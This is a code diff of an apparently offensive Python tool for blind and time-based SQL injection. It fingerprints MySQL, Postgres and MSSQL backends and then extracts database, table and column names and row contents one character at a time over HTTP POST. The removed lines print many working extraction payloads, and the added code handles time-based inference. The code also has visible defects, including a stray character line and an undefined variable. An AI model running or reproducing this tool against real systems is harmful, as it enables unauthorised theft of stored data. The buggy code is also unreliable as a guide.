@@ -13,6 +13,11 @@ from os import mkdir
 from os.path import isdir
 from os.path import isfile
 import socks
+###############################################################
+## "errorbased" is a file which contains Error Based queries ##
+###############################################################
+import errorbased
+import timebased
 
 class Injection:
 	Agentes={
@@ -63,8 +68,7 @@ class Injection:
 		'Oracle':{'Prefijo':[],'Payload':[],'Sufijo':[]}
 		}
 
-	Prefijos = [" ",
-				"'","''", #Simple Quotes
+	Prefijos = [" ","''","'", #Simple Quotes
 				"')","'))","')))", #Simple Quotes with Parentheses
 				'"','""',
 				'")','"))','")))',
@@ -75,147 +79,28 @@ class Injection:
 
 	Sufijos={
 		#'MySQL':[' ','#','-- -a'," and '%'='"],
-		'Generic':['--','-- -'+chr(randint(65,122)),""],
-		'MySQL':['#','-- -'+chr(randint(65,122)),""],
-		'Postgres':[';/*',';--',""],
-		'Mssql':['-- -'+chr(randint(65,122)),""],
-		'Oracle':['from dual;',""]
+		'Generic':['--','-- -'+chr(randint(65,122))],
+		'MySQL':['#','-- -'+chr(randint(65,122))],
+		'Postgres':["--",';/*',';--'],
+		'Mssql':['-- -'+chr(randint(65,122))],
+		'Oracle':['from dual;']
 	}
 
 	GoodRequest=0
-
-	PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
-					  # And we just used specific functions in which DBMS works
-		'Generic':[
-					  'and {0}-1={0}-1'.format(randint(2,1001)),
-				      'and ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(NoAleatorio))),
-
-				  ],
-		'MySQL':[
-					  'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
-					  'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
-					  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
-					  #Specific queries
-					  #'&& (select @@version)',
-					  'and (select database())'
-					  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
-					  ],
-		'Postgres':[
-					  'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
-					  'and (select current_database())',
-					  #'and (select user)',
-					  'and trunc(random() * cast(random()*1291 as int) - 1)>0',
-					  'and ascii(substring(@@version,1,1))=ascii("P")'
-					  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
-					],
-		'Mssql':[
-					"and (PI()* SQUARE(rand())) < {0}".format(randint(10,99)),
-					"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
-					"and CONVERT(varchar, SERVERPROPERTY('productversion')) like '%.%'",
-					"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
-					"and (LEN(host_name())>0)"
-				],
-
-		'Oracle':['and select @@version from dual']
-				}
-
-############################################################ Databases Names #######################################################################################################
-											#####################################################################
-											##  Se debe iterar el offset para recorrer registro a registro {0} ##
-											##  		iterar la posicion de recorte del Caracter {1}         ##
-											##			iterar el código ascii del Caracter {2}                ##
-											#####################################################################
-	PayloadsDBnames = {
-		#'MySQL': 'and ascii(substring((select schema_name from information_schema.schemata limit 1 offset {0}),{1},1)) < {2}',
-		'MySQL':"and ascii(substring((select group_concat(schema_name) from information_schema.schemata),{0},1)) < {1}",
-		#'Postgres': 'and ascii(substring((select datname from pg_database limit 1 offset {0}),{1},1)) < {2}',
-		'Postgres': "and ascii(substring((select array_to_string(array_agg(datname),',') from pg_database),{0},1)) < {1}",
-		'Mssql': "and ascii((select substring((select Substring((select ','+name from Sys.Databases FOR XML PATH('')),2,10000) from Sys.Databases order by name OFFSET 1 ROWS fetch next 1 rows only),{0},1))) < {1}",
-		'Oracle': ''
-		}
-						#######################################################################
-						### Variables used to determine limits for extracting database names ##
-						#######################################################################
-
-	#Length functions
-	RegisterLength = {
-		'MySQL': 'and (select length((select group_concat(schema_name) from information_schema.schemata))) < {0}',
-		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
-		'Mssql': "and LEN((select Substring(( select ','+name from Sys.Databases FOR XML PATH('')),2,10000) from Sys.Databases order by name OFFSET 1 ROWS fetch next 1 rows only)) < {0}",
-		'Oracle': ''
-		}
-
-###################################################################################################################################################################################
-############################################################ Tables ###############################################################################################################
-	#Length functions
-	TableLength = {
-		'MySQL': 'and (select length((select group_concat(table_name) from information_schema.tables where table_schema="{0}"))) < {1}',
-		'Postgres': "and (select length((select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)))) < {1}",
-		'Mssql': "and len((substring((select ','+name from {0}..sysobjects where xtype = 'U' for xml path('')),2,10000))) < {1}",
-		'Oracle': ''
-		}
-
-# (select length((SELECT array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid))))
-
-#select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)
-
-	TablesName={
-		'MySQL':'and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="{0}"),{1},1)) < {2}',
-		#'Postgres':"and ascii(substring((select array_to_string(array_agg(table_name),',') FROM information_schema.tables where table_schema='public' ),{1},1)) < {2}",
-		'Postgres':"and ascii(substring((select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)),{1},1)) < {2}",
-		'Mssql':"and ascii(substring((substring((select ','+name from {0}..sysobjects where xtype = 'U' for xml path('')),2,10000)),{1},1)) < {2}",
-		'Oracle':''
-		}
-###################################################################################################################################################################################
-
-
-####################################################################################################################################################################################
-############################################################ Columns ###############################################################################################################
-	#Length functions
-	ColumnLength = {
-		'MySQL': 'and (select length((select group_concat(column_name) from information_schema.columns where table_schema="{0}" and table_name="{1}"))) < {2}',
-		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
-		'Mssql': "and len((substring((select ','+{0}..syscolumns.name from {0}..syscolumns, {0}..sysobjects where {0}..syscolumns.id={0}..sysobjects.id AND {0}..sysobjects.name='{1}' for xml path('')),2,10000))) < {2}",
-		'Oracle': ''
-		}
-
-# select group_concat(column_name) from information_schema.columns where table_schema="lux" and table_name="mycal_settings"
-
-	ColumnNames={
-		'MySQL':'and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="{0}" and table_name="{1}"),{2},1)) < {3}',
-		'Postgres':"",
-		'Mssql':"and ascii(substring((substring((select ','+{0}..syscolumns.name from {0}..syscolumns, {0}..sysobjects where {0}..syscolumns.id={0}..sysobjects.id AND {0}..sysobjects.name='{1}' for xml path('')),2,10000)),{2},1)) < {3}",
-		'Oracle':''
-		}
-####################################################################################################################################################################################
-	#Count functions
-
-
-	numRegisters = {
-		'MySQL': 'and (select count(*) from {0}.{1}) < {2}',
-		'Postgres': 'and(select count(*) from {0}{1}) < {2}',
-		'Mssql': "and (select count(*) from {0}..{1}) < {2}",
-		'Oracle': ''
-		}
-
-####################################################################################################################################################################################
-####################################  Getting records data ####################################
-	RecordQuerys = {
-	#"and ascii(substring((select columna from Base.Tabla limit 1 offset {3}),{4},1)) < {5}"
-		'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
-		'Postgres': 'and ascii(substring((select {0} from {1}{2} limit 1 offset {3}),{4},1)) < {5}',
-		'Mssql': "and ascii(substring((select {0} from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only),{4},1)) < {5}",
-		'Oracle': ''
-		}
-
-	TamrecordQuery = {
-		'MySQL': 'and (select length((select {0} from {1}.{2} limit 1 offset {3})) < {4})',
-		'Postgres':'and (select length((select {0} from {1}{2} limit 1 offset {3})) < {4})',
-		'Mssql':"and len((select {0} from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only)) < {4}",
-		'Oracle':""
-		}
-
-	#Payloads to extract data
+l
+					#######################################
+					####   Queries loaded from files   ####
+					#######################################
+	PayloadsAttempt = 0
+	PayloadsDBnames = 0 
+	RegisterLength = 0
+	TableLength = 0 
+	TablesName = 0 
+	ColumnLength = 0 
+	ColumnNames= 0 
+	numRegisters = 0
+	RecordQuerys = 0
+	TamrecordQuery = 0 
 
 	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
 	catalogo={
@@ -243,6 +128,7 @@ class Injection:
 		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
 		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
 	}
+
 	notautos=['and 1=0-- -+']
 	SentHeaders = ""
 	respuesta = ""
@@ -262,6 +148,11 @@ class Injection:
 	todasBases = False
 	listaBases = ""
 	RelacionBaseTabla={}
+	####
+	Based = "Both"
+	Time = 1.5
+	dormir = "DOORMIR"
+
 
 	def __init__(self):
 		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
@@ -336,6 +227,12 @@ class Injection:
 	def setDBMS(self,which):
 		self.Which = which
 
+	def setBased(self,technique):
+		self.Based = technique
+
+	def setTime(self,ttime):
+		self.Time = ttime
+
 	@staticmethod
 	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna):
 		caracter = chr(Injection.getMid(up,down))
@@ -385,26 +282,24 @@ class Injection:
 						#print self.datos
 						self.dataTempo = self.datos.copy()
 						#query is a dictionary which contains the payloads append to original data
-						query = self.ChangePhrase(DataPost=self.dataTempo,FirsTime=Ftime,pload="{0}{1}{2}".format(pref,payl,suf))
+						query = self.ChangePhrase(DataPost=self.dataTempo,FirsTime=Ftime,pload="{0}{1}{2}".format(pref,payl.replace(self.dormir,str(self.Time)),suf))
 						#sleep(0.09)
 						#Attempt make a request to server with the sqli payload
 						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
 						Ftime=False
-						#print "".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
 						# Imprimir Respuesta
-						if Attempt.content == self.GoodRequest.content:
-							#print "============== First: {0} ||| Second: {1}".format(len(Attempt.content),len(self.GoodRequest.content))
-							#print Attempt.text
-	#####################################	Printing succesfull queries ##########################################
-							#print "Succesfull Query =>","".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
-							#print "Succesfull Query => ",Attempt.request.body
-
+						if self.Based == "time":
+							#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+							cumple = self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) )
+						else:
+							cumple = Attempt.content == self.GoodRequest.content
+						if cumple:
 							#After do a post request, prefix, payload and suffix will be storage in "Flags" variable
 							self.Flags[dbms]['Prefijo'].append(pref)
-							self.Flags[dbms]['Payload'].append(payl)
+							self.Flags[dbms]['Payload'].append(payl.replace(self.dormir,str(self.Time)))
 							self.Flags[dbms]['Sufijo'].append(suf)
 						else:
-							if "SQL syntax" in Attempt.content:
+							if "syntax" in Attempt.content:
 								if not ans:
 									print "\t\t\t\033[1;33m Page vulnerable to SQLi, sorry but this tool only works with Blind and Time sqli Based\033[0m"
 									try:
@@ -416,8 +311,8 @@ class Injection:
 									else:
 										print "Bye"
 										exit(1)
-	#####################################	Printing Unsuccesfull queries ##########################################							
 							pass
+	#####################################	Printing Unsuccesfull queries ##########################################
 			print "="*25,dbms," End ","="*25
 
 # Question to user if he want to continue with attack
@@ -462,11 +357,11 @@ class Injection:
 					ooo = "".join(("\033[1;36m"+"{0}={1}&").format(key, value) for key, value in self.datos.items())[:-1]
 					uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Payload']),choice(self.Flags[self.Which]['Sufijo']))
 					ooo = ooo.replace(self.Comodin,uuu)
-					self.showData(ooo)
+					self.showData(ooo,vulnerable=True)
 				except:
-					self.showData("No vulnerable try another dbms")
+					self.showData("No vulnerable try another dbms",vulnerable=False)
 
-	def showData(self,lll="",Previo=False):
+	def showData(self,lll="",Previo=False,vulnerable=""):
 		if Previo:
 			try:
 				previous = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
@@ -491,20 +386,25 @@ class Injection:
 			for i in self.GoodRequest.headers: print "\033[1;35m"+i,":",self.GoodRequest.headers.get(i)+"\033[0m"
 			####
 			## This section will write successfull data to file
-			try:
-				sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
-																	#################################################
-																	# 	Format to use when write in a file as csv 	#
-																	#   url, method, dbms, prefix, sufix, request   #
-																	#################################################
-				sss.write("{0}:::{1}:::{2}:::{3}:::{4}:::{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Sufijo']),lll))
-				sss.close()
-			except:
-				print "Failed to write data in file"
+			if vulnerable:
+				try:
+					sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
+																		#################################################
+																		# 	Format to use when write in a file as csv 	#
+																		#   url, method, dbms, prefix, sufix, request   #
+																		#################################################
+					sss.write("{0}:::{1}:::{2}:::{3}:::{4}:::{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Sufijo']),lll))
+					sss.close()
+				except:
+					print "Failed to write data in file"
+			elif not vulnerable:
+				print "Bye"
+				exit(1)
 
 
 	#Function used to replace value of variable Comodin (passphrase) with queries to detect a sqli
 	def ChangePhrase(self,DataPost="",pload="",FirsTime=False,cAscii=0,offset=0,pos=0,dname=False,cant=False,longi=False,cname=False,tname=False,nombreBase="",nombreTabla="",reina="",records=False):
+####################################################################################################################################################
 		if FirsTime:
 			#print "Primera vez ;)"
 			lol = self.datos.copy()
@@ -514,15 +414,9 @@ class Injection:
 			self.GoodRequest = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=lol,proxies=self.proxy)
 			#print "Original Request",lol
 			#sleep(0.2)
+####################################################################################################################################################			
 		# Solo sustituye el valor para la cantidad de registros
 		if cant:
-#		 	if self.Which == 'Postgres':
-#			 	for parametro in DataPost.keys():
-#			 		if self.Comodin in DataPost.get(parametro):
-			 			#DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreTabla,offset,pos,cAscii)
-#			 			DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
-#			 	return DataPost
-####################################################################################################################################################
 		 	for parametro in DataPost.keys():
 		 		if self.Comodin in DataPost.get(parametro):
 		 			DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
@@ -540,12 +434,7 @@ class Injection:
 					if self.Comodin in DataPost.get(parametro):
 						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,nombreTabla,cAscii)
 				return DataPost
-#			if reina == 'Postgres':
-#				for parametro in DataPost.keys():
-#					if self.Comodin in DataPost.get(parametro):
-#						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
-#				return DataPost
-			#Cambiar el offset y el código ascii para 
+			#Cambiar el offset y el código ascii para
 			if records:
 				for parametro in DataPost.keys():
 					if self.Comodin in DataPost.get(parametro):
@@ -607,7 +496,6 @@ class Injection:
 			self.Which = fSuccess.split(':::')[2]
 			self.newPrefix = fSuccess.split(':::')[3]
 			self.newSuffix = fSuccess.split(':::')[4]
-			#for i in range(10): print self.Which+" ::: "+self.PayloadsDBnames[self.Which].format(i)
 		except:
 			print "Target not vulnerable"
 			exit(1)
@@ -627,14 +515,21 @@ class Injection:
 			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
 			#print query
 			#sleep(0.5)
+			if self.Based == "time":
+				lcumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+				#cumple = self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) )
+			else:
+				cumple = Attempt.content == self.GoodRequest.content
 			if found:
 				break
-			if Attempt.content == self.GoodRequest.content:
+			#if Attempt.content == self.GoodRequest.content:
+			if cumple:
 				#print "Menor"
 				liminf = liminf
 				limsup = medio
 				medio = (liminf + limsup)//2
-			elif not(Attempt.content == self.GoodRequest.content):
+			#elif not(Attempt.content == self.GoodRequest.content):
+			elif not cumple:
 				#print "Mayor"
 				liminf = medio
 				limsup = limsup
@@ -651,41 +546,48 @@ class Injection:
 			found = False
 			kind = tipo
 			while True:
+				#print "LOL Time"
 				#print "kind",kind
 				self.dataTempo = self.datos.copy()
 				if kind== "base":
-					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which),self.newSuffix),longi=True,cAscii=medio)
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cAscii=medio)
 				elif kind== "tablas":
-					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TableLength.get(self.Which),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TableLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
 				elif kind== "columna":
-					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.ColumnLength.get(self.Which),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio,nombreTabla=ttname)
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.ColumnLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio,nombreTabla=ttname)
 				elif kind == "Postgres":
 					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd,self.newSuffix),longi=True,cAscii=medio,reina="Postgres")
 				elif kind == "registros":
-				 	query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd,self.newSuffix),longi=True,records=True,cAscii=medio,offset=ofset)
-					#print "Length ::::",query
+				 	query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,records=True,cAscii=medio,offset=ofset)
 				#sleep(0.5)
-				#print "Medio:",medio
+				print query
+				#print ">>",self.newSuffix
 				AttemptLongi = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if self.Based == "time":
+					cumple = (AttemptLongi.content == self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (AttemptLongi.elapsed.total_seconds()))#+ float(self.Time) ) )
+					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),AttemptLongi.elapsed.total_seconds() + float(self.Time))
+					#print "ORIGINAL:::    {0}\nAttempt::: {1}".format(self.GoodRequest.content,AttemptLongi.content)
+					#cumple = (self.GoodRequest.elapsed.total_seconds() < AttemptLongi.elapsed.total_seconds()) and (AttemptLongi.content == self.GoodRequest.content)
+				else:
+					cumple = AttemptLongi.content == self.GoodRequest.content
 				if found:
-					#print "Found",medio
 					return medio
-					#break
-
-				if AttemptLongi.content == self.GoodRequest.content:
+				#if AttemptLongi.content == self.GoodRequest.content:
+				if cumple:
 					#print "menor"
 					liminf = liminf
 					limsup = medio
 					medio = (liminf + limsup)//2
 
-				elif not(AttemptLongi.content == self.GoodRequest.content):
+				#elif not(AttemptLongi.content == self.GoodRequest.content):
+				elif not cumple:
 					#print "Mayor"
 					liminf = medio
 					limsup = limsup
 					medio = (liminf + limsup)//2
+
 				if limsup-1-liminf==0:
 					found = True
-				#print self.GoodRequest.content
 
 	def getPostDBnames(self):
 		letra = ""
@@ -695,24 +597,34 @@ class Injection:
 		print "="*3,"Guessing DB Names","="*3
 		print "="*25
 		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="base")
+		print "Tamaño Base",tamanioRegistro
 		letter = ""
 		for posicion in xrange(1,tamanioRegistro+1):
+			#print "LOL Time"
 			liminf = 31 #48 because is number 0
 			limsup = 127
 			medio = (liminf + limsup)//2
 			found = False
 			while True:
 				self.dataTempo = self.datos.copy()
-				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
+				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if self.Based == "time":
+					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time)) #(Attempt.elapsed.total_seconds())# + float(self.Time) )
+					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+					cumple = (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.content == self.GoodRequest.content)
+				else:
+					cumple = Attempt.content == self.GoodRequest.content
 				if found:
 					letter+=chr(medio)
 					break
-				if self.GoodRequest.content==Attempt.text:
+				#if self.GoodRequest.content==Attempt.text:
+				if cumple:
 					liminf = liminf
 					limsup = medio
 					medio = (liminf + limsup)//2
-				elif not(Attempt.content == self.GoodRequest.content):
+				#elif not(Attempt.content == self.GoodRequest.content):
+				elif not cumple:
 					liminf = medio
 					limsup = limsup
 					medio = (liminf + limsup)//2
@@ -735,7 +647,6 @@ class Injection:
 			print "current_database() =>",self.RelacionBaseTabla["postgres"]
 		else:
 			if self.todasBases: #Cuando el usuario escribio all
-				#for ldbname in self.listaBases:
 				for ldbn in self.BDatosName:
 					tt += self.AuxiliarTablasPost(ldbn)
 					self.RelacionBaseTabla[ldbn]=tt.split(',')
@@ -764,15 +675,22 @@ class Injection:
 				#print query
 				#sleep(0.4)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if self.Based == "time":
+					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+				else:
+					cumple = Attempt.content == self.GoodRequest.content				
+
 				if found:
 					letter+=chr(medio)
-					#return chr(medio)
 					break
-				if self.GoodRequest.content==Attempt.text:
+				#if self.GoodRequest.content==Attempt.text:
+				if cumple:
 					liminf = liminf
 					limsup = medio
 					medio = (liminf + limsup)//2
-				elif not(Attempt.content == self.GoodRequest.content):
+#				elif not(Attempt.content == self.GoodRequest.content):
+				elif not cumple:
 					liminf = medio
 					limsup = limsup
 					medio = (liminf + limsup)//2
@@ -781,10 +699,6 @@ class Injection:
 		return letter
 
 	def QueenPostgres(self):
-		#print "\n"*3
-		#print "="*23
-		#print "="*3,"Getting DB Names","="*3
-		#print "="*23
 		liminf = 48
 		limsup = 127
 		medio = (limsup+liminf)//2
@@ -792,9 +706,6 @@ class Injection:
 		oset = 0
 		cc = 0
 		lta = []
-		#
-		#pquery = "and ascii(substring((select column_name from information_schema.columns where table_schema='public' and table_name={0} limit 1 offset {1}),{2},1)) < {3}"
-		#lquery = "and select length((select column_name from information_schema.columns where table_schema='public' and table_name={0}))"
 		#Conociendo la cantidad de registros que tiene una tabla en postgres
 		for t in self.RelacionBaseTabla["postgres"]:
 			numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0}")
@@ -828,15 +739,21 @@ class Injection:
 			query = self.ChangePhrase(DataPost = self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ntm,self.newSuffix),cAscii=medio,reina="Postgres",cname=True)
 			#print query
 			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+			if self.Based == "time":
+				cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+				#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+			else:
+				cumple = Attempt.content == self.GoodRequest.content				
+
 			if found:
 				return chr(medio)
-			if self.GoodRequest.content==Attempt.content:
-				#print "Menor"
+			#if self.GoodRequest.content==Attempt.content:
+			if cumple:
 				liminf = liminf
 				limsup = medio
 				medio = (limsup + liminf)//2
-			elif not(Attempt.content==self.GoodRequest.content):
-				#print "Mayor"
+			#elif not(Attempt.content==self.GoodRequest.content):
+			elif not cumple:
 				liminf = medio
 				limsup = limsup
 				medio = (limsup + liminf)//2
@@ -860,9 +777,6 @@ class Injection:
 					self.listaColumnas=[]
 					for TablaName in self.RelacionBaseTabla.get(ldbn):
 						tt = ""
-						# print "%%%%%%%%%%%%%%"*3
-						# print "%%%%%%%%   ",TablaName,"   %%%%%%%%%%"
-						# print "%%%%%%%%%%%%%%"*3
 						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
 						self.listaColumnas = tt.split(',')
 						print "="*20
@@ -899,15 +813,21 @@ class Injection:
 				#print query
 				#sleep(0.4)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if self.Based == "time":
+					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+				else:
+					cumple = Attempt.content == self.GoodRequest.content				
 				if found:
 					letter+=chr(medio)
-					#return chr(medio)
 					break
-				if self.GoodRequest.content==Attempt.text:
+				#if self.GoodRequest.content==Attempt.text:
+				if cumple:
 					liminf = liminf
 					limsup = medio
 					medio = (liminf + limsup)//2
-				elif not(Attempt.content == self.GoodRequest.content):
+				#elif not(Attempt.content == self.GoodRequest.content):
+				elif not cumple:
 					liminf = medio
 					limsup = limsup
 					medio = (liminf + limsup)//2
@@ -967,15 +887,9 @@ class Injection:
 								lengthMsg = self.TamrecordQuery[self.Which].format(ccname,ldbn,ttname,"{0}","{1}")
 							#print lengthMsg
 							longRecord = self.LongitudRegistro(tipo="registros",ofset=renglon,ppd=lengthMsg)
-							#print "msg:",msg,"\nLong:",longRecord
 							#### Aqui hacemos uso de otra funciona para que busque el caracter por medio de iteraciones de la posicion y el código Ascii
 							lleettrraass = self.getRecords(pppp=msg,offse=renglon,longitud=longRecord)
 							print ">"*2,"\033[1;36m",lleettrraass,"\033[0m"
-						#print nr,"Registros"
-						#if self.Which=="Postgres":
-						#	payload = self.numRegisters[self.Which].format(ldbn,ttname,"{0}")
-						#	nr = self.CantidadRegistros(ppload=payload)
-
 
 	def getRecords(self,pppp="",offse="",longitud=""):
 		letras = ""
@@ -993,17 +907,22 @@ class Injection:
 				#print query
 				#print "Offset: {0} Position:{1}".format(offse,l)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if self.Based == "time":
+					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+				else:
+					cumple = Attempt.content == self.GoodRequest.content
 				if found:
-					#return chr(medio)
-					#print " ñ.ñ ",chr(medio)
 					letras+=chr(medio)
 					break
-				if self.GoodRequest.content==Attempt.content:
+				#if self.GoodRequest.content==Attempt.content:
+				if cumple:
 					#print "Menor"
 					liminf = liminf
 					limsup = medio
 					medio = (limsup + liminf)//2
-				elif not(Attempt.content==self.GoodRequest.content):
+				#elif not(Attempt.content==self.GoodRequest.content):
+				elif not cumple:
 					#print "Mayor"
 					liminf = medio
 					limsup = limsup
